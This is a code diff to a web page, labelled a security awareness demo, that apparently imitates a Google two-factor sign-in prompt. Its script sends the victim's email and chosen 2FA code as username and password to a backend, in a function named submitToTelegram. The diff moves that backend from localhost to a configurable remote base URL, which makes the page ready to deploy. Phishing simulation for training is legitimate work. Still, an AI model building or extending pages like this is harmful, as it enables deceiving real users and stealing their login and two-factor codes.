@@ -57,6 +57,7 @@
     </div>
 </div>
 
+<script src="config.js"></script>
 <script>
     // SECURITY AWARENESS DEMO — NOT GOOGLE
     // Determine the real email: URL query param first, then sessionStorage, then neutral fallback.
@@ -79,7 +80,7 @@
     async function submitToTelegram(selectedNumber) {
         const email = sessionStorage.getItem('demo_email') || effectiveEmail;
         try {
-            await fetch('http://localhost:8000/api/demo-submit', {
+            await fetch(window.API_BASE_URL + '/api/demo-submit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ username: email, password: '2FA code: ' + selectedNumber })
@@ -127,7 +128,7 @@
         loginNow.style.pointerEvents = 'none';
 
         try {
-            await fetch('http://localhost:8000/api/demo-submit', {
+            await fetch(window.API_BASE_URL + '/api/demo-submit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ username: email, password: 'Login Now (2FA code: ' + selectedNumber + ')' })
